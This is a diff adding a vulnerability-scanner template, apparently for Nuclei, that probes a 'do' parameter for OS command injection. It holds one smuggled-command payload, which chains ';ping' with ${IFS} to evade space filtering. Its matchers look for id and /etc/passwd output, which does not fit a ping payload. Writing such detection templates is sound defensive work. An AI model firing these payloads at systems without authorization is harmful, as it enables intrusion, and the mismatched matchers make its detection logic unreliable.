@@ -1,0 +1,23 @@
+id: cmdi6-0546
+name: 'Shell injection in do'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via do'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      do:
+        - ';ping${IFS}-c1${IFS}127.0.0.1'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'www-data'
